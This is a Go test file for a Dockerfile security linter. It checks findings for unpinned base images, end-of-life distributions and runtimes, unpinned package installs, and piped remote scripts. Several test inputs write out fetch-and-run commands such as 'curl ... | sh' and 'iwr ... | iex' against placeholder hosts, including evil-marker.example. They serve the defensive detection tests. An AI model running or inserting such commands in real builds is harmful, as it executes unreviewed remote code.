package secdockerfile

import (
	"fmt"
	"strings"
	"testing"
	"time"
)

// testNow is the day the end-of-life table was read.
var testNow = time.Date(2026, time.November, 4, 12, 0, 0, 0, time.UTC)

// hit is a finding's comparable part.
type hit struct {
	rule string
	line int
	sev  Severity
}

func hitsOf(r Report) []hit {
	var out []hit
	for _, f := range r.Findings {
		out = append(out, hit{f.RuleID, f.Line, f.Severity})
	}
	return out
}

func eq(a, b []hit) bool { return fmt.Sprint(a) == fmt.Sprint(b) }

// TestCheck is one case per rule row plus the shapes that must not hit.
func TestCheck(t *testing.T) {
	pinned := "@sha256:" + strings.Repeat("a", 64)
	cases := []struct {
		name      string
		file      string
		want      []hit
		unchecked int
	}{
		// S-750
		{"no tag", "FROM golang", []hit{{"S-750", 1, SeverityMedium}}, 0},
		{"latest", "FROM golang:latest", []hit{{"S-750", 1, SeverityMedium}}, 0},
		// S-751
		{"tag without digest", "FROM golang:1.27.3 AS build", []hit{{"S-751", 1, SeverityLow}}, 0},
		{"platform flag is not the image", "FROM --platform=$BUILDPLATFORM golang:1.27.3 AS build", []hit{{"S-751", 1, SeverityLow}}, 0},
		{"lower-case instruction", "from golang:1.27.3", []hit{{"S-751", 1, SeverityLow}}, 0},
		// S-752
		{"debian buster past", "FROM debian:buster" + pinned, []hit{{"S-752", 1, SeverityHigh}}, 0},
		{"debian 10 slim past", "FROM debian:10-slim" + pinned, []hit{{"S-752", 1, SeverityHigh}}, 0},
		{"ubuntu 18.04 past", "FROM ubuntu:18.04" + pinned, []hit{{"S-752", 1, SeverityHigh}}, 0},
		{"ubuntu codename past", "FROM ubuntu:focal-20240101" + pinned, []hit{{"S-752", 1, SeverityHigh}}, 0},
		{"alpine 3.15 past", "FROM alpine:3.15.4" + pinned, []hit{{"S-752", 1, SeverityHigh}}, 0},
		{"python 3.8 past", "FROM python:3.8-slim" + pinned, []hit{{"S-752", 1, SeverityHigh}}, 0},
		{"python on bullseye past", "FROM python:3.12-slim-bullseye" + pinned, []hit{{"S-752", 1, SeverityHigh}}, 0},
		{"node 16 past", "FROM node:16-alpine" + pinned, []hit{{"S-752", 1, SeverityHigh}}, 0},
		{"node codename past", "FROM node:gallium" + pinned, []hit{{"S-752", 1, SeverityHigh}}, 0},
		{"node on alpine3.15 past", "FROM node:24-alpine3.15" + pinned, []hit{{"S-752", 1, SeverityHigh}}, 0},
		{"docker.io library spelling", "FROM docker.io/library/debian:stretch" + pinned, []hit{{"S-752", 1, SeverityHigh}}, 0},
		{"distroless debian11 past", "FROM gcr.io/distroless/static-debian11:nonroot" + pinned, []hit{{"S-752", 1, SeverityHigh}}, 0},
		{"distroless nodejs20 past", "FROM gcr.io/distroless/nodejs20-debian12" + pinned, []hit{{"S-752", 1, SeverityHigh}}, 0},
		{"S-751 and S-752 together", "FROM node:16", []hit{{"S-751", 1, SeverityLow}, {"S-752", 1, SeverityHigh}}, 0},
		// S-753
		{"apt-get unpinned", "FROM scratch\nRUN apt-get update && apt-get install -y curl", []hit{{"S-753", 2, SeverityLow}}, 0},
		{"apk continuation keeps the start line", "FROM scratch\nRUN apk add \\\n    --no-cache \\\n    git", []hit{{"S-753", 2, SeverityLow}}, 0},
		// S-754
		{"pip unpinned", "FROM scratch\nRUN pip install requests", []hit{{"S-754", 2, SeverityLow}}, 0},
		{"npm global unpinned", "FROM scratch\nRUN npm i -g typescript", []hit{{"S-754", 2, SeverityLow}}, 0},
		// S-755
		{"curl pipe sh", "FROM scratch\nRUN curl -fsSL https://example.com/i.sh | sh", []hit{{"S-755", 2, SeverityMedium}}, 0},
		{"JSON form sh -c payload", `FROM scratch` + "\n" + `RUN ["/bin/sh", "-c", "curl -sL https://example.com/i.sh | bash"]`, []hit{{"S-755", 2, SeverityMedium}}, 0},
		{"JSON form bash -o pipefail -c", `FROM scratch` + "\n" + `RUN ["bash", "-o", "pipefail", "-c", "apt-get install -y jq"]`, []hit{{"S-753", 2, SeverityLow}}, 0},
		{"JSON exec form", `FROM scratch` + "\n" + `RUN ["pip", "install", "requests"]`, []hit{{"S-754", 2, SeverityLow}}, 0},
		{"heredoc body is the script", "FROM scratch\nRUN <<EOF\nset -e\ncurl -sL https://example.com/i.sh | sh\nEOF", []hit{{"S-755", 4, SeverityMedium}}, 0},
		{"heredoc under bash", "FROM scratch\nRUN bash -e <<'EOF'\napt-get install -y curl\nEOF", []hit{{"S-753", 3, SeverityLow}}, 0},
		{"pwsh shell", "FROM scratch\nSHELL [\"pwsh\", \"-Command\"]\nRUN iwr https://example.com/i.ps1 | iex", []hit{{"S-755", 3, SeverityMedium}}, 0},
		{"mount flag before the script", "FROM scratch\nRUN --mount=type=cache,target=/root/.cache pip install requests", []hit{{"S-754", 2, SeverityLow}}, 0},
		{"escape directive", "# escape=`\nFROM scratch\nRUN apt-get install -y `\n    curl", []hit{{"S-753", 3, SeverityLow}}, 0},

		// Negatives.
		{"digest only", "FROM golang@sha256:" + strings.Repeat("b", 64), nil, 0},
		{"tag and digest", "FROM golang:1.27.3" + pinned + " AS build", nil, 0},
		{"registry with a port", "FROM localhost:5000/img:1.2" + pinned, nil, 0},
		{"registry with a port and no tag", "FROM localhost:5000/img", []hit{{"S-750", 1, SeverityMedium}}, 0},
		{"scratch", "FROM scratch", nil, 0},
		{"stage reference", "FROM golang:1.27.3" + pinned + " AS build\nFROM build\nFROM BUILD AS final", nil, 0},
		{"unresolved build arg", "ARG BASE\nFROM ${BASE}", nil, 1},
		{"build arg default resolved", "ARG BASE=debian:buster\nFROM ${BASE}", []hit{{"S-751", 2, SeverityLow}, {"S-752", 2, SeverityHigh}}, 0},
		{"build arg without braces", "ARG IMG=golang\nARG TAG=1.27.3\nFROM $IMG:${TAG}", []hit{{"S-751", 3, SeverityLow}}, 0},
		{"build arg default modifier", "FROM ${BASE:-golang:1.27.3}", []hit{{"S-751", 1, SeverityLow}}, 0},
		{"stage ARG is not visible to FROM", "FROM golang:1.27.3" + pinned + " AS a\nARG NEXT=debian:buster\nFROM ${NEXT}", nil, 1},
		{"supported debian", "FROM debian:bookworm-slim" + pinned, nil, 0},
		{"moving debian name", "FROM debian:stable-slim" + pinned, nil, 0},
		{"moving python major", "FROM python:3-slim" + pinned, nil, 0},
		{"unknown image", "FROM postgres:9.6" + pinned, nil, 0},
		{"unknown cycle", "FROM node:99-alpine" + pinned, nil, 0},
		{"apt pinned", "FROM scratch\nRUN apt-get install -y curl=7.88.1-10+deb12u5", nil, 0},
		{"apk pinned", "FROM scratch\nRUN apk add --no-cache git=2.45.2-r0", nil, 0},
		{"npm ci", "FROM scratch\nRUN npm ci", nil, 0},
		{"pip from a lock", "FROM scratch\nRUN pip install -r requirements.lock --require-hashes", nil, 0},
		{"comment inside a continuation", "FROM scratch\nRUN echo a && \\\n# apt-get install curl\n    echo b", nil, 0},
		{"comment line", "# FROM debian:buster\nFROM scratch", nil, 0},
		{"COPY heredoc body is not read as instructions", "FROM scratch\nCOPY <<EOF /etc/x\nFROM debian:buster\nRUN curl -s https://x.example | sh\nEOF", nil, 0},
		{"heredoc fed to another program", "FROM scratch\nRUN cat <<EOF > /x.sh\ncurl -s https://x.example | sh\nEOF", nil, 0},
		{"ONBUILD has no rule", "FROM scratch\nONBUILD RUN pip install requests", nil, 0},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			r := CheckAt([]byte(c.file), testNow)
			if r.Status != StatusComplete {
				t.Fatalf("status %s", r.Status)
			}
			if got := hitsOf(r); !eq(got, c.want) {
				t.Fatalf("got %v want %v", got, c.want)
			}
			if r.UncheckedFrom != c.unchecked {
				t.Fatalf("unchecked FROM %d, want %d", r.UncheckedFrom, c.unchecked)
			}
		})
	}
}

// TestNearEndOfLife: within 90 days of end of life is medium, with its own
// fixed text; past it is high.
func TestNearEndOfLife(t *testing.T) {
	file := []byte("FROM node:22-alpine@sha256:" + strings.Repeat("c", 64))
	near := time.Date(2027, time.March, 1, 0, 0, 0, 0, time.UTC)
	r := CheckAt(file, near)
	if len(r.Findings) != 1 || r.Findings[0].Severity != SeverityMedium || r.Findings[0].Message != NearEOLMessage {
		t.Fatalf("near: %+v", r.Findings)
	}
	if r.Findings[0].Detail != "node 22 (jod), end of life on 2027-04-30" {
		t.Fatalf("near detail %q", r.Findings[0].Detail)
	}
	r = CheckAt(file, time.Date(2027, time.May, 1, 0, 0, 0, 0, time.UTC))
	if len(r.Findings) != 1 || r.Findings[0].Severity != SeverityHigh || r.Findings[0].Detail != "node 22 (jod), end of life since 2027-04-30" {
		t.Fatalf("past: %+v", r.Findings)
	}
	if r := CheckAt(file, testNow); len(r.Findings) != 0 {
		t.Fatalf("far: %+v", r.Findings)
	}
}

// TestEndOfLifeWorstCycle: a tag naming two cycles reports the worse one.
func TestEndOfLifeWorstCycle(t *testing.T) {
	// node 20 ended 2026-04-30; bullseye 2026-08-31: both past, the
	// earlier date wins.
	r := CheckAt([]byte("FROM node:20-bullseye-slim@sha256:"+strings.Repeat("d", 64)), testNow)
	if len(r.Findings) != 1 || r.Findings[0].Detail != "node 20 (iron), end of life since 2026-04-30" {
		t.Fatalf("%+v", r.Findings)
	}
}

// TestFindingsCarryNoRepositoryText: messages and details come from the
// tables only.
func TestFindingsCarryNoRepositoryText(t *testing.T) {
	file := "FROM evil-marker:latest\nFROM debian:buster\nRUN curl -s https://evil-marker.example/x | sh # evil-marker\n"
	for _, f := range CheckAt([]byte(file), testNow).Findings {
		if strings.Contains(f.Message, "evil") || strings.Contains(f.Detail, "evil") {
			t.Fatalf("repository text in %+v", f)
		}
	}
}

// TestOverCap: a file over the cap is not checked.
func TestOverCap(t *testing.T) {
	r := CheckAt([]byte(strings.Repeat("#", MaxDockerfileBytes+1)), testNow)
	if r.Status != StatusOverCap || r.Complete() {
		t.Fatalf("%+v", r)
	}
}

// TestTruncatedRun: a RUN script past the classifier's cap is counted.
func TestTruncatedRun(t *testing.T) {
	r := CheckAt([]byte("FROM scratch\nRUN echo "+strings.Repeat("x", 300<<10)), testNow)
	if r.TruncatedRuns != 1 {
		t.Fatalf("%+v", r)
	}
}

// TestRepositoryDockerfiles is the golden corpus: the FROM and ARG lines of
// this repository's own Dockerfiles (trimmed copies, so the test stays
// hermetic). Expected: S-751 on the nine FROM lines without a digest, and
// nothing else. deploy/sandbox-image/Dockerfile's FROM ${BASE} resolves to
// its global ARG's digest-pinned default, so it is checked and clean.
func TestRepositoryDockerfiles(t *testing.T) {
	const goPinned = "golang:1.27.3@sha256:2920bb124f1a2e12a1d39f0cab756ae0068441ee1da7655dec7f5e374944095b"
	const dlPinned = "gcr.io/distroless/static-debian12:nonroot@sha256:afa5c872c891853ca7fcf1f12c3edb23f7eeef36189728842dd51042ff57f7ab"
	files := map[string]string{
		"Dockerfile.observer-cloud":          "FROM --platform=$BUILDPLATFORM " + goPinned + " AS build\nARG TARGETOS TARGETARCH\nARG VERSION=dev\nFROM " + dlPinned,
		"Dockerfile.observer-mcpgw":          "FROM --platform=$BUILDPLATFORM " + goPinned + " AS build\nFROM " + dlPinned,
		"Dockerfile.observer-org":            "FROM --platform=$BUILDPLATFORM node:22-bookworm-slim@sha256:c3de60bf2f9dd0ac6370e6117950ff62d6e339527e7472301c9c78a017978392 AS web2\nFROM --platform=$BUILDPLATFORM " + goPinned + " AS build\nARG IMAGE=full\nFROM " + dlPinned,
		"Dockerfile.observer-postgres":       "FROM postgres:16.15-bookworm\nARG VERSION=dev",
		"deploy/observer-devnode/Dockerfile": "FROM --platform=$BUILDPLATFORM " + goPinned + " AS build\nFROM debian:bookworm-slim@sha256:7c7b2c966bc9ee8cedfeef67e0e279108992c77681fa595db4a9d65c06ccc587",
		"deploy/observer-edge/Dockerfile":    "FROM --platform=$BUILDPLATFORM golang:1.27.3 AS build\nFROM gcr.io/distroless/static-debian12:nonroot",
		"deploy/observer-gateway/Dockerfile": "FROM --platform=$BUILDPLATFORM golang:1.27.3 AS build\nFROM gcr.io/distroless/static-debian12:nonroot",
		"deploy/observer-node/Dockerfile":    "FROM --platform=$BUILDPLATFORM golang:1.27.3 AS build\nFROM debian:bookworm-slim\nARG OPENCODE_VERSION=1.18.18",
		"deploy/sandbox-image/Dockerfile":    "# syntax=docker/dockerfile:1.7\n#\n# Inputs\nARG BASE=debian:bookworm-slim@sha256:7ff6ba31527b9e336162fa061746c366c4b2032f4d2cff2078bea43f78efe3f8\n\nFROM ${BASE} AS image\nARG DEBIAN_SNAPSHOT\nRUN set -eu; \\\n    DEBIAN_FRONTEND=noninteractive apt-get install -y --no-install-recommends \\\n        $(grep -v '^#' /tmp/observer-packages.txt | grep -v '^$'); \\\n    apt-get clean\nFROM scratch AS packages\nCOPY --from=image /x /x",
		"harness-gateway/Dockerfile":         "FROM --platform=$BUILDPLATFORM node:22-alpine AS build\nFROM node:22-alpine\nARG VERSION=dev",
	}
	s751, other, unchecked := 0, 0, 0
	for name, body := range files {
		r := CheckAt([]byte(body), testNow)
		unchecked += r.UncheckedFrom
		for _, f := range r.Findings {
			if f.RuleID == "S-751" {
				s751++
			} else {
				other++
				t.Errorf("%s: unexpected %+v", name, f)
			}
		}
	}
	if s751 != 9 || other != 0 || unchecked != 0 {
		t.Fatalf("S-751 %d (want 9), other %d, unchecked %d", s751, other, unchecked)
	}
}

// TestParseImageRef pins the reference split.
func TestParseImageRef(t *testing.T) {
	cases := map[string]imageRef{
		"golang":                               {repo: "golang"},
		"golang:1.27":                          {repo: "golang", tag: "1.27"},
		"localhost:5000/img":                   {registry: "localhost:5000", repo: "img"},
		"localhost:5000/team/img:v1@sha256:ab": {registry: "localhost:5000", repo: "team/img", tag: "v1", digest: "sha256:ab"},
		"gcr.io/distroless/static-debian12:nonroot": {registry: "gcr.io", repo: "distroless/static-debian12", tag: "nonroot"},
		"team/img:v1":   {repo: "team/img", tag: "v1"},
		"img@sha256:ab": {repo: "img", digest: "sha256:ab"},
	}
	for in, want := range cases {
		if got := parseImageRef(in); got != want {
			t.Errorf("%s: got %+v want %+v", in, got, want)
		}
	}
}

// TestIsDockerfilePath pins the path class.
func TestIsDockerfilePath(t *testing.T) {
	cases := map[string]bool{
		"Dockerfile": true, "svc/Dockerfile.prod": true, `svc\Dockerfile`: true, "api.dockerfile": true,
		"Containerfile": true, "Dockerfile.dockerignore": false, "dockerfile.go": false, "README.md": false,
	}
	for in, want := range cases {
		if got := IsDockerfilePath(in); got != want {
			t.Errorf("%s: got %v want %v", in, got, want)
		}
	}
}

// TestRulesTable: every rule has text and a known severity, and every
// end-of-life row names a product the image table reads.
func TestRulesTable(t *testing.T) {
	seen := map[string]bool{}
	for _, r := range Rules {
		if r.Message == "" || seen[r.ID] || (r.Severity != SeverityHigh && r.Severity != SeverityMedium && r.Severity != SeverityLow) {
			t.Errorf("bad rule %+v", r)
		}
		seen[r.ID] = true
	}
	products := map[string]bool{"debian": true, "ubuntu": true, "alpine": true, "python": true, "node": true}
	cycles := map[string]bool{}
	for _, e := range eolTable {
		if !products[e.product] || e.eol.IsZero() || cycles[e.product+e.cycle] {
			t.Errorf("bad eol row %+v", e)
		}
		cycles[e.product+e.cycle] = true
	}
}
